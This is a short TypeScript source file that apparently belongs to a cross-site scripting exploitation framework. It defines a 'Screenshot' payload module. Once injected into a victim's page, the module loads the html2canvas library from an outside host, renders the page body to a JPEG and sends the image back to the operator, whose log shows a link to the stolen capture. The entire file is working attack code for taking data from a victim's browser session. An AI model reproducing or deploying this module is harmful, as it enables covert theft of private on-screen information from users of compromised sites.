import { XSSModule } from '../types/index.js';

export const screenshotModule: XSSModule = {
  name: 'Screenshot',
  description: 'Takes a screenshot of the page using html2canvas library.',
  
  execute: (send) => {
    const script = document.createElement('script');
    script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
    script.onload = async () => {
      // @ts-ignore - html2canvas is loaded dynamically
      const canvas = await html2canvas(document.body);
      send(canvas.toDataURL('image/jpeg', 0.2));
    };
    document.head.appendChild(script);
  },
  
  handleResult: (log, data) => {
    log(`Screenshot is back! <a target="_blank" href="${data}">Click here to see it.</a>`, 'html');
  }
};

export default screenshotModule;